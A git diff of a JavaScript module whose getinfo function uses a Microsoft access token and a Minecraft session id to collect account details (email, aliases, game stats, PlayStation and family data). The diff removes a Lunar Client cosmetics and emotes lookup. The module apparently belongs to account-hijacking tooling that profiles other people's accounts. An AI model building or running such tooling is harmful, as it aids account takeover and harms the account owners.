@@ -11,26 +11,8 @@ const getAddresses = require("../info/getAddresses");
 const getStats = require("../hypixelapi/getStats");
 const getDonutStats = require("../donutapi/getDonutStats");
 const getAliases = require("../secure/getAliases");
-const checkmc = require("../../../db/checkmc");
-const { getlunar } = require("../lunarapi/src/index");
-const {
-  getCosmeticNameById,
-  getEmoteNameById
-} = require("../../../store/assetsloader");
 const { playstationauth } = require("../secure/playstationauth");
 const getfamilydata = require("../secure/getfamilydata");
-
-function filterKnownWithId(items, getName) {
-  return items
-    .map(item => {
-      const id = typeof item === "object" ? item.cosmeticId || item.id || null : item;
-      if (!id) return null;
-      const name = getName(id);
-      if (!name) return null;
-      return name;
-    })
-    .filter(Boolean);
-}
 
 async function getinfo(hasamc, oldname, axios, msatoken, uid, mc, ssid, playxbl, mpurchase) {
   const info = {
@@ -40,16 +22,8 @@ async function getinfo(hasamc, oldname, axios, msatoken, uid, mc, ssid, playxbl,
     email: null,
     aliases: null,
     canary: null,
-    cosmetics: {
-      allcosmetics: null,
-      equippedcosmetics: null,
-      lunarrank: null,
-      lunarfreecosmetics: null
-    },
-    emotes: {
-      allemotes: null,
-      equippedemotes: null
-    }
+    cosmetics: null,
+    emotes: null
   };
 
   console.log(`Getting data for user ${uid}!`);
@@ -90,70 +64,6 @@ async function getinfo(hasamc, oldname, axios, msatoken, uid, mc, ssid, playxbl,
       })()
     );
   }
-
-if (oldname && checkmc(mc)) {
-  promises.push(
-    (async () => {
-      try {
-        const d = await getlunar(ssid);
-        const [cosmeticRaw, emoteRaw] = JSON.parse(d);
-        const now = new Date();
-        const cos = JSON.stringify(cosmeticRaw);
-        console.log(`cosmetics: ${cos}`);
-
-        const allcosmeticsArray = filterKnownWithId(
-          cosmeticRaw.ownedCosmetics.filter(c => !c.expiresAt || new Date(c.expiresAt) > now),
-          getCosmeticNameById
-        );
-
-        const equippedcosmeticsArray = filterKnownWithId(
-          cosmeticRaw.settings?.equippedCosmetics || [],
-          getCosmeticNameById
-        );
-
-        const lunarfreecosmeticsArray = filterKnownWithId(
-          cosmeticRaw.lunarPlusFreeCosmeticIds || [],
-          getCosmeticNameById
-        );
-
-        const allemotesArray = filterKnownWithId(
-          emoteRaw.ownedEmoteIds || [],
-          getEmoteNameById
-        );
-
-        const equippedemotesArray = filterKnownWithId(
-          emoteRaw.equippedEmoteIds || [],
-          getEmoteNameById
-        );
-
-        info.cosmetics.allcosmetics = allcosmeticsArray.length ? allcosmeticsArray.join(", ") : "None";
-        info.cosmetics.equippedcosmetics = equippedcosmeticsArray.length ? equippedcosmeticsArray.join(", ") : "None";
-        info.cosmetics.lunarrank = cosmeticRaw.rankName || "None";
-        info.cosmetics.lunarfreecosmetics = lunarfreecosmeticsArray.length ? lunarfreecosmeticsArray.join(", ") : "None";
-        info.emotes.allemotes = allemotesArray.length ? allemotesArray.join(", ") : "None";
-        info.emotes.equippedemotes = equippedemotesArray.length ? equippedemotesArray.join(", ") : "None";
-
-        // Count owned cosmetics only
-        let ownedCosmetics = cosmeticRaw.ownedCosmetics || [];
-        const validCosmeticCount = ownedCosmetics.reduce((count, c) => {
-          return getCosmeticNameById(c.cosmeticId) ? count + 1 : count;
-        }, 0);
-
-        // Count owned emotes only
-        let ownedEmotes = emoteRaw.ownedEmoteIds || [];
-        const validEmoteCount = ownedEmotes.reduce((count, id) => {
-          return getEmoteNameById(id) ? count + 1 : count;
-        }, 0);
-
-        info.cosmetics.cosmeticamount = validCosmeticCount;
-        info.emotes.emotesamount = validEmoteCount;
-
-      } catch (e) {
-        console.error(`Error getting Lunar data for user ${uid}:`, e);
-      }
-    })()
-  );
-}
 
 
 if (playxbl && mpurchase) {
